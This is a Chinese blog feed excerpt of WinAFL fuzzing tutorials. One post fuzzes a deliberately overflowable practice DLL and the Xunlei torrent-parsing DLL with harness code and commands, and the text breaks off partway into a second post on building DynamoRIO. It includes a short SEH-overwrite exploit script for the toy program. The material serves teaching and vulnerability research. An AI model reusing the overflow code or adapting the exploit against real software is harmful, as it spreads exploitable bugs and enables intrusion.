    <published>2023-07-19T14:06:52.000Z</published>
    <updated>2023-07-21T03:32:53.355Z</updated>
    
    <content type="html"><![CDATA[<p>为什么不叫高级篇，因为高级的我也不会</p><p>主要讲一下更贴近实际的用法吧</p><p>!!!仅大标题1完成，全片未完待续!!!</p><span id="more"></span><h1 id="对dll进行fuzz"><a class="markdownIt-Anchor" href="#对dll进行fuzz"></a> 对DLL进行Fuzz</h1><h2 id="理论测试"><a class="markdownIt-Anchor" href="#理论测试"></a> 理论测试</h2><p>代码还是上一篇提到的代码，依旧是32位，只不过溢出部分写在DLL里面</p><p><code>dll.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o mydll.dll dll.c</span><br></pre></td></tr></table></figure><p><code>main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllimport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main main.c mydll.dll</span><br></pre></td></tr></table></figure><p>不想联合编译的话也可以使用<code>GetProAddress</code>来编写如下harness</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(__cdecl *pvuln)</span><span class="params">(<span class="type">char</span>* aFileName)</span>;</span><br><span class="line">pvuln vuln = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> mydll_path[] = <span class="string">&quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\dll\\mydll.dll&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">hMyDLL = LoadLibraryA(mydll_path);</span><br><span class="line"><span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">vuln = (pvuln)GetProcAddress(hMyDLL,<span class="string">&quot;vuln&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(vuln == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line"><span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line">FreeLibrary(hMyDLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始插桩看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-debug ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">main.exe .\in\password.txt</span><br></pre></td></tr></table></figure><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">main.exe @@</span><br></pre></td></tr></table></figure><p>瞬间找到crash</p><p><img src="https://img.joe1sn.top/uploads/big/daaf8adb1d017be8d9a2cfe663b3e31e.png" alt="image-20230719223344759" /></p><p>样本长这样</p><p><img src="https://img.joe1sn.top/uploads/big/54e297bf0dc0db9abedc7f7a9dde0eb7.png" alt="image-20230719223644693" /></p><p>这次尝试使用x32dbg分析</p><p><img src="https://img.joe1sn.top/uploads/big/d7671aece307bb7bea07693d3ee10c34.png" alt="image-20230719223859881" /></p><p>得到EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xEA\x23\x40\x00&quot;</span>    <span class="comment">#004023EA</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span><span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2b31205d967b4cbe010d72e2fa611249.png" alt="image-20230719224736838" /></p><p>要点就是：<strong>Fuzz的时候和插桩的时候加上<code>-coverage_module &lt;你的dll&gt;</code></strong></p><h2 id="实际测试"><a class="markdownIt-Anchor" href="#实际测试"></a> 实际测试</h2><p>你已经学会了1+1=2，请证明费马大定理吧，为了统一和方便，这里也用看雪里面的一篇文章</p><p><a href="https://bbs.kanxue.com/thread-265958.htm">使用winafl对迅雷的torrent解析逻辑进行fuzz </a></p><p>首先是找到合适的软件，然后知道他那个功能是在那个dll中的，你可以使用<code>ProcessMonitor</code>查看（俗称<code>procmon</code>），截图没有，特征就是当你打开一个<code>.torrent</code>文件后，<code>thunder.exe</code>会马上加载<code>AssisstantTools.dll</code>。通过查看导出表可以找到一些可以测试的函数，这里我测试的是<code>XL_ParseTorrentFile</code></p><img src="https://img.joe1sn.top/uploads/big/445b9aecbc3b84a5f61ac18ff7ca2b78.png" alt="image-20230721110915736" style="zoom:50%;" /><p>查看导入表可以看到依赖的<code>P2PBase.dll</code></p><img src="https://img.joe1sn.top/uploads/big/ee4fca4ffb70d73f4b43d937125d366a.png" alt="image-20230721111002412" style="zoom:50%;" /><p>所以fuzz的时候也要加上，开始编写harness，你可以用那篇文章里面的，但是我这里就很慢，<br />原文文章中的harness由于<code>using</code>附近的代码只在<code>c++11</code>中支持，所以使用gcc编译报错的可以尝试加上<code>-std=c++11</code><br />如果你使用的是下面我编写的harness，那么直接编译就可以了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ParseTorrentFile)</span><span class="params">(CHAR* aFileName, PVOID* a1)</span></span>;</span><br><span class="line">pXL_ParseTorrentFile XL_ParseTorrentFile = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ReleaseTorrentFileInfo)</span><span class="params">(PVOID a1)</span></span>;</span><br><span class="line">pXL_ReleaseTorrentFileInfo XL_ReleaseTorrentFileInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">fuzz_method</span><span class="params">(<span class="type">char</span> *FilePath)</span></span>&#123;</span><br><span class="line">    PVOID a1 = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">XL_ParseTorrentFile</span>(FilePath, &amp;a1);</span><br><span class="line">    <span class="keyword">if</span> (a1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">XL_ReleaseTorrentFileInfo</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//char AssisstantToolsPath[] = &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\a.dll&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">hMyDLL = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;AssistantTools.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">XL_ParseTorrentFile = (pXL_ParseTorrentFile)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ParseTorrentFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(XL_ParseTorrentFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">XL_ReleaseTorrentFileInfo = (pXL_ReleaseTorrentFileInfo)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ReleaseTorrentFileInfo&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(XL_ReleaseTorrentFileInfo == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fuzz_method</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line"><span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line"><span class="built_in">FreeLibrary</span>(hMyDLL);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你可以用<code>drrun -t drcov --</code>来测试看是不是使用成功，之后使用<code>drrun</code>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe&quot; ^</span><br><span class="line">-c winafl.dll -debug ^</span><br><span class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_offset 0x11ef ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 ^</span><br><span class="line">-- fuzz_program.exe &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin\ubuntu-18.04.5-desktop-amd64.iso.torrent&quot;</span><br></pre></td></tr></table></figure><ul><li><p><strong>问题1：</strong></p><p>如果你使用的<code>Dynamorio</code>是大于 <strong>8.0.0-1</strong>版本的，很大概率会出现错误类似于下面</p><img src="https://img.joe1sn.top/uploads/big/8be39e57103291b9933c16e1a6e5938e.png" alt="image-20230721111548243" style="zoom: 50%;" /><p>这种情况就是生成覆盖率文件是对的，但是测试的时候当程序进行IAT导入的时候，在<code>dynamorio</code>中的harness崩溃了，所以程序还没有进入<code>entry</code>入口点函数就直接寄了。这个错误很有意思，加载类似<code>ntdll.dll</code>或者自己在windows上写的DLL（哪怕无符号）都可以，当harness中的<code>LoadLibrary</code>载入其他DLL的时候（比如某个软件的<code>ffmpeg.dll</code>）也会报错。<br />这个问题我解决了一天也没有解决，到是在看雪找了一个和我一样的帖子</p><p><a href="https://bbs.kanxue.com/thread-274169.htm">https://bbs.kanxue.com/thread-274169.htm</a></p><p><strong>最后我的解决方法是更换到dynamorio 8.0.0-1版本过后重新编译就行了</strong></p></li><li><p><strong>问题2：</strong></p><p>当你使用<code>target_method</code>的时候，程序找不到该方法，这在你进行测试winafl案例的时候很常见，原因是该方法没有进行导出，在函数前面加上<code>extern &quot;C&quot; __declspec(dllexport)</code>就行了</p><img src="https://img.joe1sn.top/uploads/big/9445f402596260b4ace1ac70c24f489b.png" alt="image-20230721112432715" style="zoom:50%;" /></li></ul><p>首先就是缩减testcase</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\winafl-cmin.py&quot; --working-dir &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release&quot; -D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; -t 9000 -i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin&quot; -o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; -coverage_module AssistantTools.dll -coverage_module P2PBase.dll -target_module fuzz_program.exe -target_method fuzz_method -nargs 1 -- fuzz_program.exe @@ </span><br></pre></td></tr></table></figure><p>然后开始fuzz，开启一个Master吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 9000 -- ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_method fuzz_method ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">fuzz_program.exe @@</span><br></pre></td></tr></table></figure><ul><li><p><code>-M</code>: 指定这是一个Master进程</p></li><li><p><code>-i -</code>：当fuzz暂停的时候恢复，在AFL上是<code>-in -</code>，具体用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i -&quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img.joe1sn.top/uploads/big/f8eda3779cf4f5a853f8a2e4370b3dfb.png" alt="img" /></p><p>自己改写的harness确实快，但也不至于一下子就跑出来，这里我用旧版本的迅雷试了下</p><img src="https://img.joe1sn.top/uploads/big/964c55b0c61c8d59db09b4b65d3deabb.png" alt="img" style="zoom:67%;" /><p>也就是一个被修复的÷0报错（EXCEPTION_INT_DIVIDE_BY_ZERO）</p><p>昨天16h高强度修复问题1，暂时更新到这里</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;为什么不叫高级篇，因为高级的我也不会&lt;/p&gt;
&lt;p&gt;主要讲一下更贴近实际的用法吧&lt;/p&gt;
&lt;p&gt;!!!仅大标题1完成，全片未完待续!!!&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞挖掘】win-afl使用指北-初级篇</title>
    <link href="https://joe1sn.eu.org/2023/07/18/win-afl/"/>
    <id>https://joe1sn.eu.org/2023/07/18/win-afl/</id>
    <published>2023-07-18T07:27:44.000Z</published>
    <updated>2023-07-19T14:08:42.244Z</updated>
    
    <content type="html"><![CDATA[<p>在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记</p><p>这里主要讲述WinAFL+DynamoRIO的Fuzz方法</p><span id="more"></span><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><p>知道创宇这篇文章讲的已经很好了：<a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p>由于闭源特点，那么需要使用DynamoRIO进行插桩，检测指令块的转移</p><p>WinAFL主要特点就是将AFL中的函数使用WinAPI进行重写，然后调用DynamoRIO的API完成fuzz</p><h1 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h1><p>主要是参考了<a href="https://bbs.kanxue.com/thread-261323.htm%E5%92%8C%E5%AE%98%E6%96%B9%E8%BF%87%E7%A8%8B%EF%BC%9Ahttps://dynamorio.org/page_building.html">https://bbs.kanxue.com/thread-261323.htm和官方过程：https://dynamorio.org/page_building.html</a></p><h2 id="dynamorio"><a class="markdownIt-Anchor" href="#dynamorio"></a> DynamoRIO</h2><h3 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h3><h4 id="1-编译"><a class="markdownIt-Anchor" href="#1-编译"></a> 1. 编译</h4><p>软件下载一把梭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/DynamoRIO/dynamorio.git</span><br><span class="line">cd dynamorio</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><p>这里我使用的是<code>x86 Native Tools Command Prompt</code>命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16&quot; -A Win32 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/77bda948b6a701db350fb235797056e0.png" alt="image-20230719000330825" /></p><p>如果发现缺少什么的话，使用<code>set Name=Value</code>再编译，最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --build . --config RelWithDebInfo</span><br></pre></td></tr></table></figure><h4 id="2-测试"><a class="markdownIt-Anchor" href="#2-测试"></a> 2. 测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_win32\bin32\drrun.exe&quot; -t drcov -- &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\HelloWorld.exe&quot; &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\password.txt&quot;</span><br></pre></td></tr></table></figure><p>这里我换成了老版本 dynamorio-cronbuild-8.0.18684，因为新版本是3.0版本的覆盖率文件，IDA Lighthouse只支持2.0，不过你可以通过<a href="https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282%E8%BF%9B%E8%A1%8C%E7%89%88%E6%9C%AC%E7%9A%84%E8%BD%AC%E6%8D%A2%E3%80%82">https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282进行版本的转换。</a></p><p><img src="https://img.joe1sn.top/uploads/big/47ade84053329cd3875e97c5d3c19562.png" alt="image-20230719081301132" /></p><h3 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h3><h4 id="1-编译-2"><a class="markdownIt-Anchor" href="#1-编译-2"></a> 1. 编译</h4><p>按照官方的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%comspec% /k &quot;C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsamd64_x86.bat&quot;</span><br></pre></td></tr></table></figure><p>或者启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Developer Command Prompt for VS 2019</span><br></pre></td></tr></table></figure><p>然后进行cmake配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -A x64 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/0e10d36abf96b93682871ec08ace8fa9.png" alt="image-20230719081540005" /></p><p>就可以参考看雪那篇文章修改下报错</p><p>利用cmake-gui修改完过后就可以继续回到cmd进行编译了（也可以用vs2019）</p><p><img src="https://img.joe1sn.top/uploads/big/f3984b961053db86e86b2e2056e66173.png" alt="image-20230719081913889" /></p><h4 id="2-测试-2"><a class="markdownIt-Anchor" href="#2-测试-2"></a> 2. 测试</h4><p><img src="https://img.joe1sn.top/uploads/big/e212aa65d03465a205a2b64ff66ea06d.png" alt="image-20230719082924046" /></p><h2 id="winafl"><a class="markdownIt-Anchor" href="#winafl"></a> WinAFL</h2><p>起手式</p><figure class="highlight 